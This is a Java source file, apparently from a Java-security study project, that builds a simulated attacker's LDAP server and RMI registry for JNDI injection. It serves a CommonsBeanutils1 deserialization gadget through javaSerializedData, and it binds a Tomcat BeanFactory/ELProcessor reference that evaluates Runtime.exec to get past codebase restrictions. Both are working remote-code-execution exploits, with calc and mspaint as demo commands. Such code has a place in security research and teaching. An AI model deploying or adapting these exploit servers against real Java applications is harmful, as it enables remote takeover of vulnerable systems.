package com.pinger.javasec.jndi;

import com.pinger.javasec.common.CommonsBeanutils1;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author : p1n93r
 * @date : 2021/8/9 10:30
 * 模拟攻击者的Ldap Server
 */
public class Attack {

    private static final String LDAP_BASE = "dc=example,dc=com";

    /**
     * 使用javaSerializedData直接传递序列化数据
     */
    public static void usejavaSerializedData()throws Exception{
        int port = 8585;

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new OperationInterceptor());
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("Listening on 0.0.0.0:" + port);
        ds.startListening();
    }

    /**
     * 使用本地Factory进行绕过
     */
    public static void useLocalFactory()throws Exception{
        System.out.println("Creating evil RMI registry on port 8585");
        Registry registry = LocateRegistry.createRegistry(8585);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('calc')\")"));
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Shell", referenceWrapper);
    }

    public static void main ( String[] args ) throws Exception{
        usejavaSerializedData();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        public OperationInterceptor () {}

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception exception ) {
                exception.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            System.out.println("target LDAP reference result is " + base);
            e.addAttribute("javaClassName", "p1n93r");
            // 准备好弹药，准备发送到javaSerializedData
            Object payload = CommonsBeanutils1.getPayload("mspaint");
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(payload);
            objectOutputStream.close();
            e.addAttribute("javaSerializedData",byteArrayOutputStream.toByteArray());
            byteArrayOutputStream.close();
            // 开炮
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
